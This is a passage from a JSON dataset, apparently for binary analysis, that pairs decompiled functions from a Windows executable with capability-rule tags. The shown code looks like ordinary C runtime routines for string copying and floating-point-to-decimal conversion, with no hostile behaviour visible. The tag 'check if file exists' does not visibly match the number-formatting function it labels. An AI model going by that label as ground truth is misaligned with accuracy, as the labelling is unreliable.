        "decompiled_code": "\nuint __cdecl fcn.0041d0ec(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h != NULL) goto code_r0x0041d024;\n        if (arg_ch != 0) goto code_r0x0041d03b;\n        goto code_r0x0041d01c;\n    }\n    if (arg_8h != NULL) {\ncode_r0x0041d024:\n        if (arg_ch != 0) {\n            if ((arg_14h == 0) || (arg_10h != NULL)) {\n                var_8h = arg_14h;\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                do {\n                    if (*piVar3 == 0) {\n                        if (arg_14h != -1) {\n                            if (arg_14h != 0) goto code_r0x0041d090;\n                            goto code_r0x0041d0b5;\n                        }\n                        iVar4 = arg_10h - piVar3;\n                        goto code_r0x0041d076;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            *arg_8h = 0;\n        }\n    }\ncode_r0x0041d03b:\n    puVar2 = fcn.0040e0ee();\n    uStack28 = 0x16;\n    goto code_r0x0041d042;\n    while (iVar5 = iVar5 + -1,  iVar5 != 0) {\ncode_r0x0041d076:\n        iVar1 = *(iVar4 + piVar3);\n        *piVar3 = iVar1;\n        piVar3 = piVar3 + 1;\n        if (iVar1 == 0) goto code_r0x0041d01c;\n    }\n    goto code_r0x0041d0bc;\n    while( true ) {\n        iVar5 = iVar5 + -1;\n        if (iVar5 == 0) goto code_r0x0041d0bc;\n        var_8h = var_8h + -1;\n        if (var_8h == 0) break;\ncode_r0x0041d090:\n        iVar1 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        *piVar3 = iVar1;\n        piVar3 = piVar3 + 1;\n        if (iVar1 == 0) goto code_r0x0041d01c;\n    }\ncode_r0x0041d0b5:\n    if (var_8h == 0) {\n        *piVar3 = 0;\n    }\ncode_r0x0041d0bc:\n    if (iVar5 == 0) {\n        if (arg_14h == -1) {\n            arg_8h[arg_ch + -1] = 0;\n            uStack28 = 0x50;\n        }\n        else {\n            *arg_8h = 0;\n            puVar2 = fcn.0040e0ee();\n            uStack28 = 0x22;\ncode_r0x0041d042:\n            *puVar2 = uStack28;\n            fcn.0040b81f();\n        }\n    }\n    else {\ncode_r0x0041d01c:\n        uStack28 = 0;\n    }\n    return uStack28;\n}\n",
        "token_count": 859
    },
    "0041ef4b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_970h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041ef4b(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    uint64_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    char cVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    char *arg_10h_00;\n    uint var_970h;\n    uint var_96ch;\n    uint32_t var_7a0h;\n    uint var_79ch;\n    uint var_794h;\n    uint32_t *var_78ch;\n    uint *var_788h;\n    uint32_t var_784h;\n    uint32_t *var_780h;\n    uint32_t *var_77ch;\n    uint32_t *var_778h;\n    uint32_t var_774h;\n    uint32_t var_770h;\n    uint32_t var_76ch;\n    uint32_t *var_768h;\n    uint32_t *var_764h;\n    uint32_t *var_760h;\n    uint32_t *var_75ch;\n    uint32_t *var_755h;\n    uint32_t *var_750h;\n    uint32_t *var_74ch;\n    uint32_t *var_748h;\n    uint32_t *var_744h;\n    uint var_740h;\n    uint32_t *var_574h;\n    uint32_t var_570h;\n    uint var_56ch;\n    uint32_t *var_3a4h;\n    uint32_t *var_3a0h;\n    uint32_t *apuStack928 [114];\n    uint32_t *var_1d4h;\n    uint32_t *var_1d0h;\n    uint32_t var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_788h = arg_18h;\n    var_75ch = arg_1ch;\n    fcn.00421e12(&var_79ch);\n    var_794h._0_1_ = (var_79ch & 0x1f) != 0x1f;\n    if (var_794h) {\n        fcn.00421e7a(&var_79ch);\n    }\n    uVar11 = arg_ch;\n    uVar4 = 0x20;\n    if ((arg_ch < 1) && (arg_ch < 0)) {\n        uVar4 = 0x2d;\n    }\n    *var_788h = uVar4;\n    var_788h[2] = var_75ch;\n    fcn.00412caf(&var_7a0h, 0, 0);\n    if (((uVar11 & 0x7ff00000) == 0) && (((arg_8h | uVar11 & 0xfffff) == 0 || ((var_7a0h & 0x1000000) != 0)))) {\n        arg_10h_00 = 0x4292a0;\n        var_788h[1] = 0;\ncode_r0x0041f063:\n        iVar5 = fcn.00412d4a(var_75ch, arg_20h, arg_10h_00);\n    }\n    else {\n        iVar5 = fcn.00414660(&arg_8h);\n        if (iVar5 == 0) {\ncode_r0x0041f0a4:\n            arg_ch = uVar11 & 0x7fffffff;\n            var_78ch = NULL;\n            var_784h = arg_10h + 1;\n            _var_774h = CONCAT44(uVar11, arg_8h) & 0x7fffffffffffffff;\n            var_770h = _var_774h >> 0x20;\n            uVar11 = var_770h >> 0x14;\n            if (uVar11 != 0) {\n                uVar15 = 0;\n                iVar5 = 0x100000;\n            }\n            else {\n                iVar5 = 0;\n                uVar15 = uVar11;\n            }\n            var_748h = uVar11 == 0;\n            var_780h = var_774h + uVar15;\n            var_1cch = (var_770h & 0xfffff) + iVar5 + CARRY4(var_774h, uVar15);\n            var_74ch = var_748h + uVar11;\n            fcn.00421ed0();\n            fcn.00421fe0();\n            var_76ch = fcn.00423020();\n            if ((var_76ch == 0x7fffffff) || (var_76ch == 0x80000000)) {\n                var_76ch = 0;\n            }\n            var_1d0h = var_780h;\n            var_748h = (var_1cch != 0) + 1;\n            var_1d4h = var_748h;\n            if (var_74ch < 0x433) {\n                if (var_74ch == 0x35) {\ncode_r0x0041f648:\n                    _var_774h = _var_774h & 0xffffffff;\n                    uVar11 = (&var_1d0h)[var_1cch != 0];\n                    iVar5 = 0x1f;\n                    if (uVar11 != 0) {\n                        for (; uVar11 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar11 == 0) {\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = iVar5 + 1;\n                    }\n                    puVar13 = (iVar5 == 0x20) + var_748h;\n                    if (puVar13 < 0x74) {\n                        puVar16 = puVar13 + -1;\n                        if (puVar16 != 0xffffffff) {\n                            puVar17 = puVar13 + -2;\n                            puVar12 = var_748h;\n                            do {\n                                if (puVar16 < puVar12) {\n                                    iVar5 = (&var_1d0h)[puVar16];\n                                }\n                                else {\n                                    iVar5 = 0;\n                                }\n                                if (puVar17 < puVar12) {\n                                    uVar11 = (&var_1d4h)[puVar16];\n                                }\n                                else {\n                                    uVar11 = 0;\n                                }\n                                (&var_1d0h)[puVar16] = uVar11 >> 0x1f | iVar5 * 2;\n                                puVar16 = puVar16 + -1;\n                                puVar17 = puVar17 + -1;\n                                puVar12 = var_1d4h;\n                            } while (puVar16 != 0xffffffff);\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0040ed22(&var_1d0h, 0x1cc, &var_570h, 0);\n                        puVar13 = var_1d4h;\n                    }\n                    var_1d4h = puVar13;\n                    uVar11 = 0x434 - var_74ch;\n                    uVar15 = uVar11 >> 5;\n                    fcn.004085e0(&var_570h);\n                    (&var_570h)[uVar15] = 1 << (uVar11 & 0x1f);\n                }\n                else {\n                    var_570h = 0;\n                    var_56ch = 0x100000;\n                    var_574h = 0x2;\n                    if (var_1cch == 0) goto code_r0x0041f648;\n                    iVar5 = 0;\n                    do {\n                        if (*(&var_570h + iVar5) != *(&var_1d0h + iVar5)) goto code_r0x0041f648;\n                        iVar5 = iVar5 + 4;\n                    } while (iVar5 != 8);\n                    iVar5 = 0x1f;\n                    if (var_1cch != 0) {\n                        for (; var_1cch >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    _var_774h = _var_774h & 0xffffffff;\n                    if (var_1cch == 0) {\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = iVar5 + 1;\n                    }\n                    puVar13 = (0x20U - iVar5 < 2) + var_748h;\n                    if (puVar13 < 0x74) {\n                        puVar16 = puVar13 + -1;\n                        if (puVar16 != 0xffffffff) {\n                            puVar17 = puVar13 + -2;\n                            puVar12 = var_748h;\n                            do {\n                                if (puVar16 < puVar12) {\n                                    iVar5 = (&var_1d0h)[puVar16];\n                                }\n                                else {\n                                    iVar5 = 0;\n                                }\n                                if (puVar17 < puVar12) {\n                                    uVar11 = (&var_1d4h)[puVar16];\n                                }\n                                else {\n                                    uVar11 = 0;\n                                }\n                                (&var_1d0h)[puVar16] = uVar11 >> 0x1e | iVar5 << 2;\n                                puVar16 = puVar16 + -1;\n                                puVar17 = puVar17 + -1;\n                                puVar12 = var_1d4h;\n                            } while (puVar16 != 0xffffffff);\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0040ed22(&var_1d0h, 0x1cc, &var_570h, 0);\n                        puVar13 = var_1d4h;\n                    }\n                    var_1d4h = puVar13;\n                    uVar11 = 0x435 - var_74ch;\n                    uVar15 = uVar11 >> 5;\n                    fcn.004085e0(&var_570h);\n                    (&var_570h)[uVar15] = 1 << (uVar11 & 0x1f);\n                }\n                var_574h = uVar15 + 1;\n                var_3a4h = var_574h;\n                fcn.0040ed22(&var_3a0h, 0x1cc, &var_570h, var_574h * 4);\n            }\n            else {\n                var_570h = 0;\n                var_56ch = 0x100000;\n                var_574h = 0x2;\n                if (var_1cch == 0) {\ncode_r0x0041f393:\n                    var_764h = var_74ch + -0x432 & 0x1f;\n                    *NULL = var_74ch + -0x432 >> 5;\n                    var_780h = 0x20 - var_764h;\n                    iVar5 = fcn.00422e50();\n                    puVar13 = var_748h;\n                    var_750h = iVar5 + -1;\n                    _var_774h = _var_774h & 0xffffffff;\n                    var_77ch = ~var_750h;\n                    uVar11 = (&var_1d4h)[var_748h];\n                    iVar5 = 0x1f;\n                    if (uVar11 != 0) {\n                        for (; uVar11 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar11 == 0) {\n                        var_748h = NULL;\n                    }\n                    else {\n                        var_748h = iVar5 + 1;\n                    }\n                    if ((stack0xfffff8a8 + puVar13 < 0x74) &&\n                       (var_778h = (0x20 - var_748h < var_764h) + stack0xfffff8a8 + puVar13,  var_778h < 0x74)) {\n                        var_768h = stack0xfffff8a8 + -1;\n                        var_74ch = var_778h + -1;\n                        if (var_74ch != var_768h) {\n                            puVar16 = var_74ch - stack0xfffff8a8;\n                            var_760h = &var_1d4h + puVar16;\n                            do {\n                                if (puVar16 < puVar13) {\n                                    var_748h = var_760h[1];\n                                }\n                                else {\n                                    var_748h = NULL;\n                                }\n                                if (puVar16 + -1 < puVar13) {\n                                    uVar11 = *var_760h;\n                                }\n                                else {\n                                    uVar11 = 0;\n                                }\n                                (&var_1d0h)[var_74ch] =\n                                     (uVar11 & var_77ch) >> (var_780h & 0x1f) |\n                                     (var_748h & var_750h) << (var_764h & 0x1f);\n                                var_74ch = var_74ch + -1;\n                                var_760h = var_760h + -1;\n                                puVar16 = puVar16 + -1;\n                                puVar13 = var_1d4h;\n                            } while (var_74ch != var_768h);\n                        }\n                        var_1d4h = var_778h;\n                        if (stack0xfffff8a8 != NULL) {\n                            puVar8 = &var_1d0h;\n                            for (puVar13 = stack0xfffff8a8; puVar13 != NULL; puVar13 = puVar13 + -1) {\n                                *puVar8 = 0;\n                                puVar8 = puVar8 + 1;\n                            }\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0040ed22(&var_1d0h, 0x1cc, &var_570h, 0);\n                    }\n                    var_570h = 2;\n                }\n                else {\n                    iVar5 = 0;\n                    do {\n                        if (*(&var_570h + iVar5) != *(&var_1d0h + iVar5)) goto code_r0x0041f393;\n                        iVar5 = iVar5 + 4;\n                    } while (iVar5 != 8);\n                    var_764h = var_74ch + -0x431 & 0x1f;\n                    *NULL = var_74ch + -0x431 >> 5;\n                    var_750h = 0x20 - var_764h;\n                    iVar5 = fcn.00422e50();\n                    puVar13 = var_748h;\n                    var_768h = iVar5 + -1;\n                    _var_774h = _var_774h & 0xffffffff;\n                    var_780h = ~var_768h;\n                    uVar11 = (&var_1d4h)[var_748h];\n                    iVar5 = 0x1f;\n                    if (uVar11 != 0) {\n                        for (; uVar11 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar11 == 0) {\n                        var_748h = NULL;\n                    }\n                    else {\n                        var_748h = iVar5 + 1;\n                    }\n                    if ((stack0xfffff8a8 + puVar13 < 0x74) &&\n                       (var_77ch = (0x20 - var_748h < var_764h) + stack0xfffff8a8 + puVar13,  var_77ch < 0x74)) {\n                        var_778h = stack0xfffff8a8 + -1;\n                        var_74ch = var_77ch + -1;\n                        if (var_74ch != var_778h) {\n                            puVar16 = var_74ch - stack0xfffff8a8;\n                            var_760h = &var_1d4h + puVar16;\n                            do {\n                                if (puVar16 < puVar13) {\n                                    var_748h = var_760h[1];\n                                }\n                                else {\n                                    var_748h = NULL;\n                                }\n                                if (puVar16 + -1 < puVar13) {\n                                    uVar11 = *var_760h;\n                                }\n                                else {\n                                    uVar11 = 0;\n                                }\n                                (&var_1d0h)[var_74ch] =\n                                     (uVar11 & var_780h) >> (var_750h & 0x1f) |\n                                     (var_748h & var_768h) << (var_764h & 0x1f);\n                                var_74ch = var_74ch + -1;\n                                var_760h = var_760h + -1;\n                                puVar16 = puVar16 + -1;\n                                puVar13 = var_1d4h;\n                            } while (var_74ch != var_778h);\n                        }\n                        var_1d4h = var_77ch;\n                        if (stack0xfffff8a8 != NULL) {\n                            puVar8 = &var_1d0h;\n                            for (puVar13 = stack0xfffff8a8; puVar13 != NULL; puVar13 = puVar13 + -1) {\n                                *puVar8 = 0;\n                                puVar8 = puVar8 + 1;\n                            }\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0040ed22(&var_1d0h, 0x1cc, &var_570h, 0);\n                    }\n                    var_570h = 4;\n                }\n                var_56ch = 0;\n                var_3a4h = 0x1;\n                var_574h = 0x1;\n                fcn.0040ed22(&var_3a0h, 0x1cc, &var_570h, 4);\n            }\n            var_780h = 0xa;\n            if (var_76ch < 0) {\n                var_778h = -var_76ch / 10;\n                var_770h = -var_76ch % 10;\n                _var_774h = _var_774h & 0xffffffff | var_770h << 0x20;\n                if (var_778h != NULL) {\n                    do {\n                        unique0x10001420 = var_778h;\n                        if (0x26 < var_778h) {\n                            stack0xfffff67c = 0x26;\n                        }\n                        uVar11 = *(*NULL * 4 + 0x4271fe);\n                        uVar15 = *(*NULL * 4 + 0x4271ff);\n                        var_574h = uVar15 + uVar11;\n                        fcn.004085e0(&var_570h);\n                        fcn.00408060(&var_570h + uVar11, *(stack0xfffff8a8 * 4 + 0x4271fc) * 4 + 0x4268f8, uVar15 << 2);\n                        puVar13 = var_1d0h;\n                        var_74ch = var_574h;\n                        if (var_574h < 0x2) {\n                            if (var_570h == 0) {\n                                var_970h = 0;\n                                var_1d4h = NULL;\n                                fcn.0040ed22(&var_1d0h, 0x1cc, &var_96ch, 0);\n                            }\n                            else if ((var_570h != 1) && (var_1d4h != NULL)) {\n                                uVar11 = 0;\n                                var_78ch = var_1d4h;\n                                puVar13 = NULL;\n                                do {\n                                    uVar15 = (&var_1d0h)[puVar13];\n                                    uVar10 = var_570h * uVar15;\n                                    (&var_1d0h)[puVar13] = uVar10 + uVar11;\n                                    uVar11 = (var_570h * uVar15 >> 0x20) + CARRY4(uVar10, uVar11);\n                                    puVar13 = puVar13 + 1;\n                                } while (puVar13 != var_1d4h);\n                                if (uVar11 == 0) goto code_r0x0041fd38;\n                                if (var_1d4h < 0x73) {\n                                    (&var_1d0h)[var_1d4h] = uVar11;\n                                    var_1d4h = var_1d4h + 1;\n                                    goto code_r0x0041fd38;\n                                }\n                                var_970h = 0;\n                                var_1d4h = NULL;\n                                fcn.0040ed22(&var_1d0h, 0x1cc, &var_96ch, 0);\n                                bVar2 = false;\n                                goto code_r0x0042003e;\n                            }\ncode_r0x0041fd38:\n                            bVar2 = true;\n                        }\n                        else {\n                            if (var_1d4h < 0x2) {\n                                var_78ch = var_1d0h;\n                                var_1d4h = var_574h;\n                                fcn.0040ed22(&var_1d0h, 0x1cc, &var_570h, var_574h << 2);\n                                if (puVar13 == NULL) {\n                                    var_970h = 0;\n                                    var_1d4h = NULL;\n                                    iVar5 = 0;\n                                    puVar8 = &var_96ch;\n                                    goto code_r0x0042002b;\n                                }\n                                if ((puVar13 != 0x1) && (var_1d4h != NULL)) {\n                                    uVar11 = 0;\n                                    var_77ch = var_1d4h;\n                                    puVar13 = NULL;\n                                    do {\n                                        uVar15 = (&var_1d0h)[puVar13];\n                                        uVar10 = ZEXT48(var_78ch) * uVar15;\n                                        (&var_1d0h)[puVar13] = uVar10 + uVar11;\n                                        uVar11 = (ZEXT48(var_78ch) * uVar15 >> 0x20) + CARRY4(uVar10, uVar11);\n                                        puVar13 = puVar13 + 1;\n                                    } while (puVar13 != var_1d4h);\n                                    if (uVar11 != 0) {\n                                        if (0x72 < var_1d4h) {\ncode_r0x004200ef:\n                                            var_970h = 0;\n                                            var_1d4h = NULL;\n                                            fcn.0040ed22(&var_1d0h, 0x1cc, &var_96ch, 0);\n                                            bVar2 = false;\n                                            goto code_r0x0042003e;\n                                        }\n                                        (&var_1d0h)[var_1d4h] = uVar11;\n                                        var_1d4h = var_1d4h + 1;\n                                    }\n                                }\n                            }\n                            else {\n                                var_760h = &var_570h;\n                                if (var_574h < var_1d4h) {\n                                    var_764h = var_1d4h;\n                                    var_750h = &var_1d0h;\n                                }\n                                else {\n                                    var_760h = &var_1d0h;\n                                    var_764h = var_574h;\n                                    var_750h = &var_570h;\n                                    var_74ch = var_1d4h;\n                                }\n                                var_1d4h = NULL;\n                                puVar13 = NULL;\n                                var_744h = NULL;\n                                if (var_74ch != NULL) {\n                                    do {\n                                        if (var_760h[puVar13] == 0) {\n                                            if (puVar13 == var_1d4h) {\n                                                (&var_740h)[puVar13] = 0;\n                                                var_1d4h = puVar13 + 1;\n                                                var_744h = var_1d4h;\n                                            }\n                                        }\n                                        else {\n                                            var_748h = NULL;\n                                            var_768h = NULL;\n                                            puVar16 = puVar13;\n                                            if (var_764h != NULL) {\n                                                do {\n                                                    if (puVar16 == 0x73) break;\n                                                    if (puVar16 == var_1d4h) {\n                                                        (&var_740h)[puVar16] = 0;\n                                                        var_744h = puVar13 + 1 + var_768h;\n                                                    }\n                                                    uVar11 = var_750h[var_768h];\n                                                    uVar15 = var_760h[puVar13];\n                                                    uVar6 = uVar11 * uVar15;\n                                                    puVar9 = uVar6 + var_748h;\n                                                    puVar17 = &var_740h + puVar16;\n                                                    uVar10 = *puVar17;\n                                                    *puVar17 = puVar9 + *puVar17;\n                                                    var_748h = (uVar11 * uVar15 >> 0x20) + CARRY4(uVar6, var_748h) +\n                                                               CARRY4(uVar10, puVar9);\n                                                    var_768h = var_768h + 1;\n                                                    puVar16 = puVar16 + 1;\n                                                    var_1d4h = var_744h;\n                                                } while (var_768h != var_764h);\n                                                if (var_748h != NULL) {\n                                                    puVar17 = var_748h;\n                                                    var_748h = &var_740h + puVar16;\n                                                    do {\n                                                        if (puVar16 == 0x73) break;\n                                                        if (puVar16 == var_1d4h) {\n                                                            *var_748h = 0;\n                                                            var_744h = puVar16 + 1;\n                                                        }\n                                                        puVar12 = var_748h + 1;\n                                                        puVar16 = puVar16 + 1;\n                                                        uVar11 = *var_748h;\n                                                        *var_748h = *var_748h + puVar17;\n                                                        puVar17 = CARRY4(uVar11, puVar17);\n                                                        var_1d4h = var_744h;\n                                                        var_748h = puVar12;\n                                                    } while (puVar17 != NULL);\n                                                }\n                                            }\n                                            if (puVar16 == 0x73) goto code_r0x004200ef;\n                                        }\n                                        puVar13 = puVar13 + 1;\n                                    } while (puVar13 != var_74ch);\n                                }\n                                iVar5 = var_1d4h << 2;\n                                puVar8 = &var_740h;\ncode_r0x0042002b:\n                                fcn.0040ed22(&var_1d0h, 0x1cc, puVar8, iVar5);\n                            }\n                            bVar2 = true;\n                        }\ncode_r0x0042003e:\n                        if (!bVar2) goto code_r0x0042013d;\n                        var_778h = var_778h - stack0xfffff8a8;\n                    } while (var_778h != NULL);\n                }\n                if (var_770h != 0) {\n                    uVar11 = *(var_770h * 4 + 0x427294);\n                    _var_774h = _var_774h & 0xffffffff | uVar11 << 0x20;\n                    if (uVar11 == 0) {\ncode_r0x0042013d:\n                        var_1d4h = NULL;\n                        puVar8 = &var_1d0h;\n                        goto code_r0x0042014a;\n                    }\n                    if ((uVar11 != 1) && (var_1d4h != NULL)) {\n                        var_750h = NULL;\n                        puVar13 = NULL;\n                        do {\n                            uVar15 = (&var_1d0h)[puVar13];\n                            uVar10 = uVar11 * uVar15;\n                            (&var_1d0h)[puVar13] = uVar10 + var_750h;\n                            var_750h = (uVar11 * uVar15 >> 0x20) + CARRY4(uVar10, var_750h);\n                            puVar13 = puVar13 + 1;\n                        } while (puVar13 != var_1d4h);\n                        if (var_750h != NULL) {\n                            if (0x72 < var_1d4h) goto code_r0x0042013d;\n                            (&var_1d0h)[var_1d4h] = var_750h;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                    }\n                }\n            }\n            else {\n                var_78ch = var_76ch % 10;\n                for (var_750h = var_76ch / 10; var_750h != NULL; var_750h = var_750h - var_748h) {\n                    var_748h = var_750h;\n                    if (0x26 < var_750h) {\n                        var_748h = 0x26;\n                    }\n                    uVar11 = *(var_748h * 4 + 0x4271fe);\n                    uVar15 = *(var_748h * 4 + 0x4271ff);\n                    var_574h = uVar15 + uVar11;\n                    fcn.004085e0(&var_570h);\n                    fcn.00408060(&var_570h + uVar11, *(var_748h * 4 + 0x4271fc) * 4 + 0x4268f8, uVar15 << 2);\n                    puVar13 = var_3a0h;\n                    var_74ch = var_574h;\n                    if (var_574h < 0x2) {\n                        if (var_570h == 0) {\n                            var_744h = NULL;\n                            var_3a4h = NULL;\n                            fcn.0040ed22(&var_3a0h, 0x1cc, &var_740h, 0);\n                        }\n                        else if ((var_570h != 1) && (var_3a4h != NULL)) {\n                            puVar13 = NULL;\n                            var_77ch = var_3a4h;\n                            puVar16 = NULL;\n                            do {\n                                puVar17 = apuStack928[puVar16 + -1];\n                                uVar11 = var_570h * ZEXT48(puVar17);\n                                apuStack928[puVar16 + -1] = uVar11 + puVar13;\n                                puVar13 = (var_570h * ZEXT48(puVar17) >> 0x20) + CARRY4(uVar11, puVar13);\n                                puVar16 = puVar16 + 1;\n                            } while (puVar16 != var_3a4h);\n                            if (puVar13 == NULL) goto code_r0x0041f83e;\n                            if (var_3a4h < 0x73) {\n                                apuStack928[var_3a4h + -1] = puVar13;\n                                var_3a4h = var_3a4h + 1;\n                                goto code_r0x0041f83e;\n                            }\n                            var_574h = NULL;\n                            var_3a4h = NULL;\n                            fcn.0040ed22(&var_3a0h, 0x1cc, &var_570h, 0);\n                            bVar2 = false;\n                            goto code_r0x0041fb61;\n                        }\ncode_r0x0041f83e:\n                        bVar2 = true;\n                    }\n                    else {\n                        if (var_3a4h < 0x2) {\n                            var_77ch = var_3a0h;\n                            var_3a4h = var_574h;\n                            fcn.0040ed22(&var_3a0h, 0x1cc, &var_570h, var_574h << 2);\n                            if (puVar13 == NULL) {\n                                var_574h = NULL;\n                                var_3a4h = NULL;\n                                iVar5 = 0;\n                                puVar8 = &var_570h;\n                                goto code_r0x0041fb4e;\n                            }\n                            if ((puVar13 != 0x1) && (var_3a4h != NULL)) {\n                                puVar13 = NULL;\n                                var_768h = var_3a4h;\n                                puVar16 = NULL;\n                                do {\n                                    puVar17 = apuStack928[puVar16 + -1];\n                                    uVar11 = ZEXT48(var_77ch) * ZEXT48(puVar17);\n                                    apuStack928[puVar16 + -1] = uVar11 + puVar13;\n                                    puVar13 = (ZEXT48(var_77ch) * ZEXT48(puVar17) >> 0x20) + CARRY4(uVar11, puVar13);\n                                    puVar16 = puVar16 + 1;\n                                } while (puVar16 != var_3a4h);\n                                if (puVar13 != NULL) {\n                                    if (0x72 < var_3a4h) {\n                                        var_574h = NULL;\n                                        puVar8 = &var_570h;\ncode_r0x0041fbc7:\n                                        var_3a4h = NULL;\n                                        fcn.0040ed22(&var_3a0h, 0x1cc, puVar8, 0);\n                                        bVar2 = false;\n                                        goto code_r0x0041fb61;\n                                    }\n                                    apuStack928[var_3a4h + -1] = puVar13;\n                                    var_3a4h = var_3a4h + 1;\n                                }\n                            }\n                        }\n                        else {\n                            var_764h = &var_570h;\n                            if (var_574h < var_3a4h) {\n                                var_760h = var_3a4h;\n                                var_778h = &var_3a0h;\n                            }\n                            else {\n                                var_764h = &var_3a0h;\n                                var_760h = var_574h;\n                                var_778h = &var_570h;\n                                var_74ch = var_3a4h;\n                            }\n                            var_3a4h = NULL;\n                            puVar13 = NULL;\n                            var_744h = NULL;\n                            if (var_74ch != NULL) {\n                                do {\n                                    if (var_764h[puVar13] == 0) {\n                                        if (puVar13 == var_3a4h) {\n                                            (&var_740h)[puVar13] = 0;\n                                            var_3a4h = puVar13 + 1;\n                                            var_744h = var_3a4h;\n                                        }\n                                    }\n                                    else {\n                                        stack0xfffff8a8 = NULL;\n                                        var_768h = NULL;\n                                        puVar16 = puVar13;\n                                        if (var_760h != NULL) {\n                                            do {\n                                                if (puVar16 == 0x73) break;\n                                                if (puVar16 == var_3a4h) {\n                                                    (&var_740h)[puVar16] = 0;\n                                                    var_744h = puVar13 + 1 + var_768h;\n                                                }\n                                                uVar11 = var_778h[var_768h];\n                                                uVar15 = var_764h[puVar13];\n                                                uVar6 = uVar11 * uVar15;\n                                                uVar10 = (&var_740h)[puVar16];\n                                                uVar7 = uVar6 + (&var_740h)[puVar16];\n                                                (&var_740h)[puVar16] = uVar7 + stack0xfffff8a8;\n                                                *0x8 = (uVar11 * uVar15 >> 0x20) + CARRY4(uVar6, uVar10) +\n                                                       CARRY4(uVar7, stack0xfffff8a8);\n                                                var_768h = var_768h + 1;\n                                                puVar16 = puVar16 + 1;\n                                                var_3a4h = var_744h;\n                                            } while (var_768h != var_760h);\n                                            if (stack0xfffff8a8 != NULL) {\n                                                puVar17 = stack0xfffff8a8;\n                                                unique0x100014a0 = &var_740h + puVar16;\n                                                do {\n                                                    if (puVar16 == 0x73) break;\n                                                    if (puVar16 == var_3a4h) {\n                                                        *stack0xfffff8a8 = 0;\n                                                        var_744h = puVar16 + 1;\n                                                    }\n                                                    puVar12 = stack0xfffff8a8 + 1;\n                                                    puVar16 = puVar16 + 1;\n                                                    uVar11 = *stack0xfffff8a8;\n                                                    *stack0xfffff8a8 = *stack0xfffff8a8 + puVar17;\n                                                    puVar17 = CARRY4(uVar11, puVar17);\n                                                    var_3a4h = var_744h;\n                                                    unique0x100014a4 = puVar12;\n                                                } while (puVar17 != NULL);\n                                            }\n                                        }\n                                        if (puVar16 == 0x73) {\n                                            var_970h = 0;\n                                            puVar8 = &var_96ch;\n                                            goto code_r0x0041fbc7;\n                                        }\n                                    }\n                                    puVar13 = puVar13 + 1;\n                                } while (puVar13 != var_74ch);\n                            }\n                            iVar5 = var_3a4h << 2;\n                            puVar8 = &var_740h;\ncode_r0x0041fb4e:\n                            fcn.0040ed22(&var_3a0h, 0x1cc, puVar8, iVar5);\n                        }\n                        bVar2 = true;\n                    }\ncode_r0x0041fb61:\n                    if (!bVar2) goto code_r0x0041fbec;\n                }\n                if (var_78ch != NULL) {\n                    var_78ch = *(var_78ch * 4 + 0x427294);\n                    if (var_78ch == NULL) {\ncode_r0x0041fbec:\n                        var_3a4h = NULL;\n                        puVar8 = &var_3a0h;\ncode_r0x0042014a:\n                        var_970h = 0;\n                        fcn.0040ed22(puVar8, 0x1cc, &var_96ch, 0);\n                    }\n                    else if ((var_78ch != 0x1) && (var_3a4h != NULL)) {\n                        var_750h = NULL;\n                        puVar13 = NULL;\n                        do {\n                            puVar16 = apuStack928[puVar13 + -1];\n                            uVar11 = ZEXT48(var_78ch) * ZEXT48(puVar16);\n                            apuStack928[puVar13 + -1] = uVar11 + var_750h;\n                            var_750h = (ZEXT48(var_78ch) * ZEXT48(puVar16) >> 0x20) + CARRY4(uVar11, var_750h);\n                            puVar13 = puVar13 + 1;\n                        } while (puVar13 != var_3a4h);\n                        if (var_750h != NULL) {\n                            if (0x72 < var_3a4h) goto code_r0x0041fbec;\n                            apuStack928[var_3a4h + -1] = var_750h;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                    }\n                }\n            }\n            puVar13 = var_75ch;\n            var_74ch = var_75ch;\n            if (var_1d4h != NULL) {\n                var_750h = NULL;\n                puVar16 = NULL;\n                do {\n                    uVar11 = (&var_1d0h)[puVar16];\n                    uVar15 = uVar11 * 10;\n                    (&var_1d0h)[puVar16] = uVar15 + var_750h;\n                    var_750h = (uVar11 * 10 >> 0x20) + CARRY4(uVar15, var_750h);\n                    puVar16 = puVar16 + 1;\n                } while (puVar16 != var_1d4h);\n                if 